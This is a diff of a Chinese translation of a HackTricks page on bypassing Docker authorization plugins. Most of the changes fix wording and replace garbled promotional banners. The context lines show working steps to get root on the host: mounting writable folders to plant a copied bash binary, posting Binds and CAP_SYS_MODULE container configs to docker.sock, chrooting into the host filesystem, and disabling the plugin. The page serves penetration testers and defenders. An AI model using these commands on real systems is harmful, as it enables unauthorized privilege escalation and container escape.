@@ -1,20 +1,16 @@
-{% hnnt styte=" acceas" %}
-GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
-Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
+{% hint style="success" %}
+学习与实践 AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dotsilp>
+<details>
 
-<oummpr>SupportHackTricks</smmay>
+<summary>支持 HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
-* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 {% endhint %}
 
 
@@ -22,7 +18,7 @@ Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**an
 
 # 基本架构
 
-Docker Auth 插件是 **外部** **插件**，您可以使用它们来 **允许/拒绝** 请求到 Docker 守护进程的 **操作**，具体取决于请求的 **用户** 和 **请求的操作**。
+Docker Auth 插件是 **外部** **插件**，您可以使用它们来 **允许/拒绝** **请求** Docker 守护进程的 **操作**，具体取决于请求的 **用户** 和 **请求的操作**。
 
 **[以下信息来自文档](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
@@ -34,15 +30,15 @@ Docker Auth 插件是 **外部** **插件**，您可以使用它们来 **允许/
 
 ![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-每个发送到插件的请求 **包括经过身份验证的用户、HTTP 头和请求/响应体**。只有 **用户名** 和 **使用的身份验证方法** 被传递给插件。最重要的是，**不** 会传递用户 **凭据** 或令牌。最后，**并非所有请求/响应体都发送** 到授权插件。只有那些 `Content-Type` 为 `text/*` 或 `application/json` 的请求/响应体会被发送。
+发送到插件的每个请求 **包括经过身份验证的用户、HTTP 头和请求/响应体**。只有 **用户名** 和 **使用的身份验证方法** 被传递给插件。最重要的是，**不** 会传递用户 **凭据** 或令牌。最后，**并非所有请求/响应体都发送** 到授权插件。只有那些 `Content-Type` 为 `text/*` 或 `application/json` 的请求/响应体会被发送。
 
-对于可能劫持 HTTP 连接的命令（`HTTP Upgrade`），例如 `exec`，授权插件仅在初始 HTTP 请求时被调用。一旦插件批准命令，后续流程不再应用授权。具体来说，流数据不会传递给授权插件。对于返回分块 HTTP 响应的命令，例如 `logs` 和 `events`，仅 HTTP 请求会发送到授权插件。
+对于可能劫持 HTTP 连接的命令（`HTTP Upgrade`），如 `exec`，授权插件仅在初始 HTTP 请求时被调用。一旦插件批准命令，后续流程不再应用授权。具体来说，流数据不会传递给授权插件。对于返回分块 HTTP 响应的命令，如 `logs` 和 `events`，仅 HTTP 请求会发送到授权插件。
 
 在请求/响应处理过程中，一些授权流程可能需要对 Docker 守护进程进行额外查询。为了完成这些流程，插件可以像普通用户一样调用守护进程 API。为了启用这些额外查询，插件必须提供管理员配置适当身份验证和安全策略的手段。
 
 ## 多个插件
 
-您负责将 **插件** 注册为 Docker 守护进程 **启动** 的一部分。您可以安装 **多个插件并将它们链接在一起**。此链可以是有序的。每个对守护进程的请求按顺序通过链。只有当 **所有插件都授予访问权限** 时，访问才会被授予。
+您负责将 **插件** 注册为 Docker 守护进程 **启动** 的一部分。您可以安装 **多个插件并将它们链接在一起**。此链可以是有序的。每个对守护进程的请求按顺序通过链。只有当 **所有插件都授予访问** 资源时，访问才会被授予。
 
 # 插件示例
 
@@ -64,7 +60,7 @@ Docker Auth 插件是 **外部** **插件**，您可以使用它们来 **允许/
 
 ## 枚举访问
 
-主要检查的内容是 **允许哪些端点** 和 **允许哪些 HostConfig 的值**。
+主要检查的内容是 **允许哪些端点** 和 **允许哪些 HostConfig 值**。
 
 要执行此枚举，您可以 **使用工具** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
@@ -98,7 +94,7 @@ docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a3
 
 ## 挂载可写文件夹
 
-在这种情况下，系统管理员**不允许用户使用 `--privileged` 标志运行容器**或给予容器任何额外的能力，他只允许挂载 `/tmp` 文件夹：
+在这种情况下，系统管理员**不允许用户使用 `--privileged` 标志运行容器**或给予容器任何额外的能力，他只允许挂载`/tmp`文件夹：
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -110,7 +106,7 @@ host> /tmp/bash
 {% hint style="info" %}
 注意，您可能无法挂载文件夹 `/tmp`，但您可以挂载一个 **不同的可写文件夹**。您可以使用以下命令查找可写目录：`find / -writable -type d 2>/dev/null`
 
-**注意，并非所有 Linux 机器中的目录都支持 suid 位！** 要检查哪些目录支持 suid 位，请运行 `mount | grep -v "nosuid"`。例如，通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup` 和 `/var/lib/lxcfs` 不支持 suid 位。
+**注意，并非所有 Linux 机器上的目录都支持 suid 位！** 要检查哪些目录支持 suid 位，请运行 `mount | grep -v "nosuid"`。例如，通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup` 和 `/var/lib/lxcfs` 不支持 suid 位。
 
 还要注意，如果您可以 **挂载 `/etc`** 或任何其他 **包含配置文件** 的文件夹，您可以在 docker 容器中以 root 身份更改它们，以便 **在主机中滥用它们** 并提升权限（可能修改 `/etc/shadow`）。
 {% endhint %}
@@ -137,7 +133,7 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 {% hint style="warning" %}
-注意在这个例子中，我们将 **`Binds`** 参数作为 JSON 的根级键使用，但在 API 中它出现在 **`HostConfig`** 键下。
+注意在这个例子中，我们将 **`Binds`** 参数作为 JSON 的根级键使用，但在 API 中它出现在 **`HostConfig`** 键下
 {% endhint %}
 
 ### HostConfig 中的 Binds
@@ -160,7 +156,7 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ## 未检查的 JSON 属性
 
-可能在系统管理员配置 docker 防火墙时，他 **忘记了一些参数的重要属性**，例如 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的 "**Capabilities**" 在 "**HostConfig**" 内。以下示例中，可以利用此错误配置创建并运行具有 **SYS\_MODULE** 能力的容器：
+系统管理员在配置 docker 防火墙时，**可能忘记了某个参数的重要属性**，例如 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的 "**Capabilities**" 在 "**HostConfig**" 内。以下示例中，可以利用此错误配置创建并运行具有 **SYS\_MODULE** 能力的容器：
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -171,7 +167,7 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 {% hint style="info" %}
-**`HostConfig`** 通常是包含 **有趣** **权限** 的关键，可以用来逃离容器。然而，正如我们之前讨论的，注意在外部使用 Binds 也有效，并可能允许你绕过限制。
+**`HostConfig`** 通常是包含 **有趣的** **权限** 的关键，可以用来逃离容器。然而，正如我们之前讨论的，注意在外部使用 Binds 也有效，并且可能允许你绕过限制。
 {% endhint %}
 
 ## 禁用插件
@@ -194,26 +190,17 @@ docker plugin enable authobot
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## 参考资料
-{% hnt stye="acceas" %}
-AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
-Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
+{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dtil>
+<details>
 
-<ummr>SupportHackTricks</smmay>
+<summary>支持 HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
 </details>
 {% endhint %}
